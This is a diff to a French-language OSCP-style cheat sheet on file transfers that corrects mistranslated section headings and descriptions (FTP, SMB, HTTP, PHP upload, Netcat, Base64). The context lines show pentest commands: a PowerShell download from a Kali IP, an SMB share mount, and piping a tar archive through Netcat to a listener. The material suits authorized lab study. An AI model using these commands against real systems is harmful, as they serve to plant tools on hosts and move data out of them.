@@ -49,7 +49,7 @@ upload [file_name] [optional_file_destination_path]
 
 ## FTP
 
-Transférer ou récupérer des fichiers dans le laboratoire.
+Transférer des fichiers via FTP.
 
 
 **Paramètres et repères :**
@@ -58,7 +58,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 ## SMB
 
-Examiner les objets, les droits et les services du domaine.
+Copier des fichiers via un partage SMB.
 
 
 <p class="oscp-command-note">Commande Impacket dans la rubrique « SMB ».</p>
@@ -79,7 +79,7 @@ net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
 
 ## Requêtes HTTP
 
-Examiner les entrées et les réponses de l'application web.
+Transférer des fichiers avec des requêtes HTTP.
 
 
 <p class="oscp-command-note">Exécuter un script Python.</p>
@@ -109,9 +109,9 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[
 ```
 
 
-## PHP Script (apporter des fichiers depuis Windows)
+## Script PHP pour recevoir des fichiers depuis Windows
 
-Examiner les entrées et les réponses de l'application web.
+Recevoir des fichiers téléversés vers un script PHP.
 
 
 **Paramètres et repères :**
@@ -174,9 +174,9 @@ service apache2 stop
 ```
 
 
-## Montant net
+## Netcat
 
-Vérifier les ports et les services de la cible autorisée.
+Transférer un fichier via une connexion Netcat.
 
 
 ### Envoyer un fichier
@@ -223,9 +223,9 @@ tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444
 ```
 
 
-### Transferring Base64 via Copy and Paste
+### Transfert Base64 par copier-coller
 
-Transférer ou récupérer des fichiers dans le laboratoire.
+Encoder un fichier en Base64 puis le reconstruire sur la machine de destination.
 
 
 
@@ -246,9 +246,9 @@ echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
 ```
 
 
-### Transferring Base64 Contents via Netcat
+### Transfert de contenu Base64 via Netcat
 
-Vérifier les ports et les services de la cible autorisée.
+Transférer du contenu encodé en Base64 via Netcat.
 
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
